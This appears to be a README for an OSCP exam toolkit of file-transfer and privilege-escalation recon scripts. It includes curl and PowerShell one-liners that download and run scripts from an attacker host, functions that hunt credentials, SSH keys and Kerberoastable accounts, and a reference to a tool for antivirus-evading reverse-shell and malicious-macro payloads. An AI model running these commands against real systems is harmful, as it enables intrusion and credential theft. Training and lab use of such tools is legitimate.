# OSCP python support tools

A small set of python tools developed to pass OSCP, this set consists of 3 scripts:

- Servpy to start services to transfer files via smb, ftp, http, https, scp, nc or socat & easy downloading tools
- recon.ps1 to assist in the windows privilege escalation process
- recon.sh to assist in the linux privilege escalation process
- Shellpy to generate payloads for reverse shells, optionally obfuscated to evade antivirus and in macro format for malicious documents
  (Shellpy can be found here --> https://github.com/KermitPurple96/Shellpy)
  
## Install
- pip install pyftpdlib pyopenssl colorama psutil
- git clone https://github.com/KermitPurple96/OSCP-PythonSupportTools
- git clone https://github.com/KermitPurple96/Shellpy

## Usage

1. Download tools
```bash
toolpy -d mimikatz -d rubeus
```
![image](https://github.com/user-attachments/assets/a9d69157-f2e7-4659-8885-06eb56d6e8b6)


2. Load the script on Target Machine

For Linux
```bash
. <(curl 10.10.10.10/recon.sh)
```

For Windows
```powershell
iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
```

Example funtions on windows:
```
PS> iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))

     ___  __    ___   ___
    /___\/ _\  / __\ / _ \  _ __ ___  ___ ___  _ __
   //  //\ \  / /   / /_)/ | '__/ _ \/ __/ _ \| '_ \
  / \_// _\ \/ /___/ ___/  | | |  __/ (_| (_) | | | |
  \___/  \__/\____/\/      |_|  \___|\___\___/|_| |_|

========================================================
                                            DannyDB@~>

[*] Auxiliary Tools:
    - aux.upload [file]               : Upload files to HTTP server via POST
    - aux.download [file]             : Perform GET to retrieve files

[*] Auxiliary Recon:
    - recon.dateScan                  : Files modified between two dates
    - recon.dateLast                  : Files modified less than 15 minutes ago
    - recon.portscan <host> [1-1024]  : Perform port scanning
    - recon.pingscan 10.10.10.        : Perform ping scan of /24 subnet
    - recon.pspy                      : Similar to pspy script
    - recon.servInfo                  : Information abaut a server

[*] General Recon:
    - recon.sys                       : System information
    - recon.users                     : User information
    - recon.programs                  : Program information
    - recon.protections               : Protection information
    - recon.process                   : Process information
    - recon.networks                  : Network information
    - recon.acl                       : File permission information

[*] Privesc Recon:
    - priv.installElev                : AlwaysInstallElevated privilege
    - priv.serv.dir                   : Service directory privilege
    - priv.serv.reg                   : Service registry privilege
    - priv.serv.unq                   : Unquoted service privilege
    - priv.cred.files                 : Known credential files privilege
    - priv.cred.history               : Credential history privilege
    - priv.owned.files                : File owner privilege
    - priv.search.fname               : Credential in file name privilege
    - priv.search.fcontent            : Credential in file content privilege
    - priv.search.sshkeys             : SSH file privilege
    - priv.search.register            : Credential in registry privilege
    - priv.search.events              : Credential in events (Admin.) privilege
    - priv.autorun                    : Scheduled tasks privilege

[*] AD Recon:
    - ad.psremote                     : Remote PowerShell privilege
    - ad.computers                    : Domain computers privilege
    - ad.users                        : Domain users privilege
    - ad.user <user>                  : Information about a user
    - ad.listusers                    : List common names for bruteforce
    - ad.groups                       : Domain groups privilege
    - ad.group <group>                : Information about a group
    - ad.spn                          : Kerberoasting accounts
    - ad.asrep                        : AS-REP Roasting users privilege

```


## Configuration

- On httpTempServ.py add your own into SHORTCUTS dictionary, add your own aliases pointing the file path to quickly access.
- Make sure that the aliases for recon.sh and recon.ps1 point to the correct path in your file system.
